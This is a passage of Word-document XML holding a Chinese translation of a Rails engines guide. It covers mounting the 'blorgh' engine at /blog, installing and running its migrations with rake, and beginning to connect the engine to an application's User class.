          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/routes.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 文件：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4320"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="78CE1029" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="79DEF0F0" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="441726561"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>mount Blorgh::Engine, :at</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "/blog"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="144EE12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这行将会挂载 engine 在应用程序的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/blog</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">。使得它在运行 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rails server</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的时候可以访问 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>http://localhost:3000/blog</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3120F43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其他的 engine，例如 Devise，处理这些有一点不同它是通过为你生成指定的自定义 ‘helper’ 例如路由中的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>devise_for</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。这些 ‘helper’ 做的基本相同的事情，挂载 engine 到一个预定义的路径的功能块是可以定制的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58464B75"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4.2 安装 engine</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BC9A10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这个 engine 包含 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>blorgh_posts</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>blorgh_comments</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 表的迁移 需要在应用程序的数据库中被创建使得 engine 的 ‘model’ 可以正确的查询他们。复制这些迁移到应用程序使用这个命令：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3840"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="62D08B67" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2133FF29" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="581331251"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>$ rake blorgh:install:migrations</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7580E18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如果你有多个 engine 需要全部迁移，使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>railties:install:migrations</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 作为替代：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4080"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="09B9E7ED" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6C581210" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="122814745"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>$ rake railties:install:migrations</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3C03292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这个命令，当第一次运行将会从 engine 复制所有的迁移。在以后的，他将仅仅复制没有被复制过的迁移。第一次运行这个命令将会产生像这样的输出：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8160"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="7AA45250" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="604F27B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Copied migration [timestamp_1]_create_blorgh_posts.rb from blorgh</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="57B29FA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Copied migration [timestamp_2]_create_blorgh_comments.rb from blorgh</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0CF6B62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第一次 时间戳(</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>\[timestamp_1\]</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>) 将会是当前的时间以及第二次时间戳(</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>\[timestamp_2\]</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>)将会是当前的的时间再加上一个（偏移的）秒。这样做的原因是因为 engine 的迁移是在任何存在在应用程序的迁移之后的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FB7EAE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要执行这些迁移到应用程序的上下文中，运行简单的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rake db:migrate</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">。当通过 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>http://localhost:3000/blog</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 访问 engine，文字将会是空的。这是因为在应用程序中创建的表和在 engine 中创建的是不一样的。向前走，欣赏刚刚挂载的 engine。你会发现它与其仅仅在 engine 中一样的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DBCC60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如果你希望仅仅对一个 engine 执行迁移，你可以通过指定 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>SCOPE</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 来完成它：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3360"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="068B991B" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4E073BBD" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1518887353"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>rake db:migrate SCOPE=blorgh</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="347D535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这会很有用如果你希望在移除它之前撤销 engine 的迁移。为了撤销从 ‘blorgh’ engine 的所有迁移你可以运行这样的代码：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4560"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="49593E9D" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="46F1E7DF" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="555360259"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>rake db:migrate SCOPE=blorgh VERSION=0</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7FC3D663"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4.3 （在 engine 中）使用一个被应用程序提供的类</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17048D8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当一个 engine 被创建后，它可能希望使用一个指定的来自应用程序的类提供 engine 块和应用程序块之间的连接。在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>blorgh</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> engine 实例中，使文章和评论拥有作者将有很大的意义。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24B532F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Usually, an application would have a </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>User</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> class that would provide the objects that would represent the posts’ and comments’ authors, but there could be a case where the application calls this class something different, such as </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Person</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. It’s because of this reason that the engine should not hardcode the associations to be exactly for a </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>User</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> class, but should allow for some flexibility around what the class is called. 通常情况，一个应用程序会有一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>User</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 类其将会提供对象来表示文章和论论的作者，这是一个示例其展示了与在应用程序中调用这个类的不同，例如 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Person</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">。这是因为 engine 不能准确的硬编码与 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>User</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 类的关系，但是应该允许关于类的一些灵活的调用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5670911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为了保持这个示例的简单，这个应用程序将会有一个名叫 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>User</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的类其将会表示应用程序的用户。在应用程序中可以使用这个命令来创建它：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3600"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="1E3C535F" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="377BAA2D" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1736588766"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>rails g model user name:string</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0B5720E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在运行 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
